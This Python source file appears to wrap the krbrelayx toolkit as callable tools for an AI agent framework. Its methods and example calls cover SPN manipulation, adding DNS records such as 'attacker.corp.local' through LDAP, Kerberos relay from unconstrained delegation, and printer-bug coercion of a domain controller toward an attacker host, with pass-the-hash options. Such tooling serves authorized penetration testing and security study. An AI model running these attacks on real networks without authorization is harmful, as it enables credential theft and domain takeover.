import sys
from pathlib import Path

from dreadnode import Config
from dreadnode.agents.tools import Toolset, tool_method
from dreadnode.tools.execute import execute

# Default path for krbrelayx scripts
# Install via: git clone https://github.com/dirkjanm/krbrelayx.git
g_default_krbrelayx_path = Path("/opt/krbrelayx/")


class Krbrelayx(Toolset):
    """
    Toolset for Kerberos relay and delegation abuse operations using krbrelayx toolkit.

    krbrelayx is a toolkit for performing various attacks on Kerberos delegation configurations.
    It includes tools for unconstrained delegation abuse, relay attacks, and SPN manipulation.

    Repository: https://github.com/dirkjanm/krbrelayx
    """

    timeout: int = Config(default=30)
    """Default timeout for commands in seconds."""
    script_path: Path = Config(default=g_default_krbrelayx_path)
    """Directory containing the krbrelayx scripts."""

    @tool_method(catch=True)
    async def krbrelayx_add_spn(
        self,
        hostname: str,
        *,
        username: str | None = None,
        password: str | None = None,
        target: str | None = None,
        spn: str | list[str] | None = None,
        remove: bool = False,
        query: bool = False,
        additional: bool = False,
        clear: bool = False,
        target_type: str | None = None,
        hashes: str | None = None,
        no_pass: bool = False,
        kerberos: bool = False,
        debug: bool = False,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute krbrelayx addspn.py to add/modify/remove Service Principal Names on AD accounts.

        Add, remove, query, or clear SPNs on Active Directory accounts via LDAP.

        Usage Examples:
            # Add an SPN to a user account
            await krbrelayx_add_spn(
                hostname="dc.corp.local",
                username="CORP\\admin",
                password="Password123",
                target="targetuser",
                spn="host/targethost.corp.local"
            )

            # Remove an SPN
            await krbrelayx_add_spn(
                hostname="dc.corp.local",
                username="CORP\\admin",
                password="Password123",
                target="targetuser",
                spn="host/targethost.corp.local",
                remove=True
            )

            # Query SPNs on an account
            await krbrelayx_add_spn(
                hostname="dc.corp.local",
                username="CORP\\admin",
                password="Password123",
                target="targetuser",
                query=True
            )

            # Clear all SPNs from an account
            await krbrelayx_add_spn(
                hostname="dc.corp.local",
                username="CORP\\admin",
                password="Password123",
                target="targetuser",
                clear=True
            )

            # Add additional SPN without removing existing ones
            await krbrelayx_add_spn(
                hostname="dc.corp.local",
                username="CORP\\admin",
                password="Password123",
                target="targetuser",
                spn="cifs/server.corp.local",
                additional=True
            )

        <documentation>
        Add or remove Service Principal Names (SPNs) on AD accounts via LDAP.

        positional arguments:
        HOSTNAME              Hostname/ip or ldap://host:port connection string to connect to

        options:
        -h, --help            show this help message and exit
        -u USERNAME, --user USERNAME
                                DOMAIN\username for authentication
        -p PASSWORD, --password PASSWORD
                                Password or LM:NTLM hash
        -t TARGET, --target TARGET
                                Target account to modify (sAMAccountName)
        -s SPN, --spn SPN     SPN to add/remove (can be specified multiple times)
        -r, --remove          Remove the SPN instead of adding it
        -q, --query           Query the target account's SPNs
        -a, --additional      Add the SPN as an additional value (do not remove existing SPNs)
        --clear               Remove all SPNs from the target account
        --target-type {samname,dn}
                                Type of target specified (default: samname)
        -d, --debug           Enable debug output

        authentication:
        -hashes LMHASH:NTHASH
                                NTLM hashes, format is LMHASH:NTHASH
        --no-pass             Don't ask for password (useful for -k)
        -k                    Use Kerberos authentication
        </documentation>

        Args:
            hostname: Hostname/IP or ldap://host:port connection string to connect to (required).
            username: DOMAIN\\username for authentication (e.g., "CORP\\admin").
            password: Password for authentication.
            target: Target account to modify (sAMAccountName or DN).
            spn: SPN to add/remove (string or list of strings for multiple SPNs).
            remove: Remove the SPN instead of adding it.
            query: Query the target account's SPNs.
            additional: Add the SPN as an additional value (do not remove existing SPNs).
            clear: Remove all SPNs from the target account.
            target_type: Type of target specified - 'samname' or 'dn' (default: samname).
            hashes: NTLM hashes in LMHASH:NTHASH format for pass-the-hash.
            no_pass: Don't ask for password (useful for Kerberos).
            kerberos: Use Kerberos authentication (requires KRB5CCNAME environment variable).
            debug: Enable debug output.
            env: Optional environment variables (e.g., KRB5CCNAME for Kerberos).
            input: Optional input string to pass to the command's stdin.
        """
        # Build command
        args = []

        if username:
            args.extend(["-u", username])

        if password:
            args.extend(["-p", password])

        if target:
            args.extend(["-t", target])

        if spn:
            if isinstance(spn, list):
                for s in spn:
                    args.extend(["-s", s])
            else:
                args.extend(["-s", spn])

        if remove:
            args.append("-r")

        if query:
            args.append("-q")

        if additional:
            args.append("-a")

        if clear:
            args.append("--clear")

        if target_type:
            args.extend(["--target-type", target_type])

        if hashes:
            args.extend(["-hashes", hashes])

        if no_pass:
            args.append("--no-pass")

        if kerberos:
            args.append("-k")

        if debug:
            args.append("-d")

        args.append(hostname)

        return await execute(
            [sys.executable, str(self.script_path / "addspn.py"), *args],
            timeout=self.timeout,
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def krbrelayx_dns_tool(
        self,
        hostname: str,
        *,
        username: str | None = None,
        password: str | None = None,
        action: str | None = None,
        record: str | None = None,
        record_type: str | None = None,
        data: str | None = None,
        legacy: bool = False,
        forest: bool = False,
        zone: str | None = None,
        hashes: str | None = None,
        no_pass: bool = False,
        kerberos: bool = False,
        debug: bool = False,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute krbrelayx dnstool.py to manipulate DNS records via LDAP.

        Add, remove, query, or modify DNS records in Active Directory-integrated DNS zones.

        Usage Examples:
            # Query DNS records
            await krbrelayx_dns_tool(
                hostname="dc.corp.local",
                username="CORP\\admin",
                password="Password123",
                action="query",
                record="attacker.corp.local"
            )

            # Add A record
            await krbrelayx_dns_tool(
                hostname="dc.corp.local",
                username="CORP\\admin",
                password="Password123",
                action="add",
                record="attacker.corp.local",
                record_type="A",
                data="10.10.10.100"
            )

            # Remove DNS record
            await krbrelayx_dns_tool(
                hostname="dc.corp.local",
                username="CORP\\admin",
                password="Password123",
                action="remove",
                record="attacker.corp.local",
                record_type="A",
                data="10.10.10.100"
            )

            # Add CNAME record
            await krbrelayx_dns_tool(
                hostname="dc.corp.local",
                username="CORP\\admin",
                password="Password123",
                action="add",
                record="alias.corp.local",
                record_type="CNAME",
                data="target.corp.local"
            )

        <documentation>
        Manipulate DNS records via LDAP for Active Directory-integrated DNS zones.

        positional arguments:
        HOSTNAME              Hostname/ip or ldap://host:port connection string to connect to

        options:
        -h, --help            show this help message and exit
        -u USERNAME, --user USERNAME
                                DOMAIN\username for authentication
        -p PASSWORD, --password PASSWORD
                                Password or LM:NTLM hash
        --action {add,modify,query,remove,resurrect,ldapdelete}
                                Action to perform
        -r RECORD, --record RECORD
                                Target record name
        --type {A,AAAA,CNAME,MX,NS,PTR,SRV,TXT}
                                DNS record type
        -d DATA, --data DATA  Record data (e.g., IP address for A records)
        --legacy              Use legacy DNS storage (for Windows 2000/2003)
        --forest              Modify DNS in forest DNS zone
        --zone ZONE           Target DNS zone
        --debug               Enable debug output

        authentication:
        -hashes LMHASH:NTHASH
                                NTLM hashes, format is LMHASH:NTHASH
        --no-pass             Don't ask for password (useful for -k)
        -k                    Use Kerberos authentication
        </documentation>

        Args:
            hostname: Hostname/IP or ldap://host:port connection string to connect to (required).
            username: DOMAIN\\username for authentication (e.g., "CORP\\admin").
            password: Password for authentication.
            action: Action to perform - 'add', 'modify', 'query', 'remove', 'resurrect', or 'ldapdelete'.
            record: Target DNS record name.
            record_type: DNS record type - 'A', 'AAAA', 'CNAME', 'MX', 'NS', 'PTR', 'SRV', or 'TXT'.
            data: Record data (e.g., IP address for A records, hostname for CNAME).
            legacy: Use legacy DNS storage (for Windows 2000/2003).
            forest: Modify DNS in forest DNS zone.
            zone: Target DNS zone.
            hashes: NTLM hashes in LMHASH:NTHASH format for pass-the-hash.
            no_pass: Don't ask for password (useful for Kerberos).
            kerberos: Use Kerberos authentication (requires KRB5CCNAME environment variable).
            debug: Enable debug output.
            env: Optional environment variables (e.g., KRB5CCNAME for Kerberos).
            input: Optional input string to pass to the command's stdin.
        """
        # Build command
        args = []

        if username:
            args.extend(["-u", username])

        if password:
            args.extend(["-p", password])

        if action:
            args.extend(["--action", action])

        if record:
            args.extend(["-r", record])

        if record_type:
            args.extend(["--type", record_type])

        if data:
            args.extend(["-d", data])

        if legacy:
            args.append("--legacy")

        if forest:
            args.append("--forest")

        if zone:
            args.extend(["--zone", zone])

        if hashes:
            args.extend(["-hashes", hashes])

        if no_pass:
            args.append("--no-pass")

        if kerberos:
            args.append("-k")

        if debug:
            args.append("--debug")

        args.append(hostname)

        return await execute(
            [sys.executable, str(self.script_path / "dnstool.py"), *args],
            timeout=self.timeout,
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def krbrelayx_relay(
        self,
        *,
        target: str | None = None,
        targetfile: str | None = None,
        clsid: str | None = None,
        port: int | None = None,
        attacker_host: str | None = None,
        attacker_port: int | None = None,
        filename: str | None = None,
        aeskey: str | None = None,
        debug: bool = False,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute krbrelayx krbrelayx.py for Kerberos relay attacks on unconstrained delegation.

        Relay Kerberos authentication from a machine with unconstrained delegation to attack targets.

        Usage Examples:
            # Basic relay attack to single target
            await krbrelayx_relay(
                target="host/victim.corp.local",
                clsid="90f18417-f0f1-484e-9d3c-59dceee5dbd8"
            )

            # Relay to multiple targets from file
            await krbrelayx_relay(
                targetfile="targets.txt",
                clsid="90f18417-f0f1-484e-9d3c-59dceee5dbd8",
                aeskey="abc123..."
            )

            # Relay with custom attacker host and port
            await krbrelayx_relay(
                target="host/victim.corp.local",
                clsid="90f18417-f0f1-484e-9d3c-59dceee5dbd8",
                attacker_host="10.10.10.100",
                attacker_port=80
            )

        <documentation>
        Relay Kerberos authentication from unconstrained delegation to attack targets.

        options:
        -h, --help            show this help message and exit
        -t TARGET, --target TARGET
                                Target SPN to attack (format: service/hostname)
        -tf TARGETFILE, --targetfile TARGETFILE
                                File containing target SPNs (one per line)
        -c CLSID, --clsid CLSID
                                CLSID to use for triggering authentication
        -p PORT, --port PORT  Port for the HTTP server (default: 80)
        --attacker-host ATTACKER_HOST
                                Attacker hostname/IP for the HTTP server
        --attacker-port ATTACKER_PORT
                                Attacker port for callback
        -f FILENAME, --filename FILENAME
                                Filename for the printer bug trigger
        --aeskey AESKEY       AES key for Kerberos authentication
        -d, --debug           Enable debug output
        </documentation>

        Args:
            target: Target SPN to attack (format: service/hostname).
            targetfile: File containing target SPNs (one per line).
            clsid: CLSID to use for triggering authentication (required for printer bug).
            port: Port for the HTTP server (default: 80).
            attacker_host: Attacker hostname/IP for the HTTP server.
            attacker_port: Attacker port for callback.
            filename: Filename for the printer bug trigger.
            aeskey: AES key for Kerberos authentication.
            debug: Enable debug output.
            env: Optional environment variables.
            input: Optional input string to pass to the command's stdin.
        """
        # Build command
        args = []

        if target:
            args.extend(["-t", target])

        if targetfile:
            args.extend(["-tf", targetfile])

        if clsid:
            args.extend(["-c", clsid])

        if port is not None:
            args.extend(["-p", str(port)])

        if attacker_host:
            args.extend(["--attacker-host", attacker_host])

        if attacker_port is not None:
            args.extend(["--attacker-port", str(attacker_port)])

        if filename:
            args.extend(["-f", filename])

        if aeskey:
            args.extend(["--aeskey", aeskey])

        if debug:
            args.append("-d")

        return await execute(
            [sys.executable, str(self.script_path / "krbrelayx.py"), *args],
            timeout=self.timeout,
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def krbrelayx_printer_bug(
        self,
        target: str,
        attacker: str,
        *,
        username: str | None = None,
        password: str | None = None,
        domain: str | None = None,
        hashes: str | None = None,
        port: int | None = None,
        debug: bool = False,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute krbrelayx printerbug.py to trigger the printer bug for unconstrained delegation.

        Trigger the printer spooler bug to coerce authentication from a target to an attacker-controlled host.

        Usage Examples:
            # Trigger printer bug with password authentication
            await krbrelayx_printer_bug(
                target="dc01.corp.local",
                attacker="attacker.corp.local",
                username="admin",
                password="Password123",
                domain="CORP"
            )

            # Trigger printer bug with pass-the-hash
            await krbrelayx_printer_bug(
                target="dc01.corp.local",
                attacker="attacker.corp.local",
                username="admin",
                domain="CORP",
                hashes="aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
            )

            # Trigger printer bug with custom port
            await krbrelayx_printer_bug(
                target="dc01.corp.local",
                attacker="attacker.corp.local",
                username="admin",
                password="Password123",
                domain="CORP",
                port=445
            )

        <documentation>
        Trigger the printer spooler bug (MS-RPRN) to coerce authentication.

        positional arguments:
        target                Target hostname/IP to trigger authentication from
        attacker              Attacker hostname/IP to receive the authentication

        options:
        -h, --help            show this help message and exit
        -u USERNAME, --username USERNAME
                                Username for authentication
        -p PASSWORD, --password PASSWORD
                                Password for authentication
        -d DOMAIN, --domain DOMAIN
                                Domain for authentication
        -hashes LMHASH:NTHASH
                                NTLM hashes, format is LMHASH:NTHASH
        --port PORT           Target port (default: 445)
        --debug               Enable debug output
        </documentation>

        Args:
            target: Target hostname/IP to trigger authentication from (required).
            attacker: Attacker hostname/IP to receive the authentication (required).
            username: Username for authentication.
            password: Password for authentication.
            domain: Domain for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format for pass-the-hash.
            port: Target port (default: 445).
            debug: Enable debug output.
            env: Optional environment variables.
            input: Optional input string to pass to the command's stdin.
        """
        # Build command
        args = []

        if username:
            args.extend(["-u", username])

        if password:
            args.extend(["-p", password])

        if domain:
            args.extend(["-d", domain])

        if hashes:
            args.extend(["-hashes", hashes])

        if port is not None:
            args.extend(["--port", str(port)])

        if debug:
            args.append("--debug")

        args.extend([target, attacker])

        return await execute(
            [sys.executable, str(self.script_path / "printerbug.py"), *args],
            timeout=self.timeout,
            input=input,
            env=env,
        )
